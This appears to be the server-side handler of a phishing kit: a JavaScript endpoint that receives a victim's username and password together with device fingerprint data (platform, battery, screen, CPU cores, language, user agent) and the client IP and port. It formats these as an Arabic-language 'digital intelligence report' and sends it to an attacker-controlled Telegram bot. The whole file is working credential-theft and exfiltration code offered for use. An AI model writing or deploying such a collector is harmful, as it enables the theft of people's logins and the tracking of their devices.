export default async function handler(req, res) {
    if (req.method === 'POST') {
        const data = req.body;
        const token = process.env.TELEGRAM_TOKEN;
        const chatId = process.env.CHAT_ID;

        // سحب الـ IP والـ Source Port
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        const port = req.socket.remotePort; // هذا هو المنفذ (Source Port)

        const message = `
🕵️‍♂️ **تـقـريـر اسـتـخـبـاراتـي رقـمـي**
━━━━━━━━━━━━━━━━━━
📝 **البيانات المستلمة:**
👤 **المستخدم:** \`${data.user}\`
🔑 **كلمة السر:** \`${data.pass}\`

🌐 **بيانات الشبكة:**
📍 **عنوان الـ IP:** \`${ip}\`
🔌 **المنفذ (Port):** \`${port}\`

📱 **معلومات الجهاز (Hardware):**
🖥 **النظام:** \`${data.platform}\`
🔋 **البطارية:** \`${data.battery}\`
📏 **الشاشة:** \`${data.screenRes}\`
🧠 **المعالج (Cores):** \`${data.cores}\`

🌐 **تفاصيل المتصفح:**
🌍 **اللغة:** \`${data.language}\`
🕒 **التوقيت:** \`${data.time}\`
🆔 **الوكيل:** \`${data.ua}\`
━━━━━━━━━━━━━━━━━━
        `;

        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            }),
        });

        res.status(200).json({ success: true });
    }
}
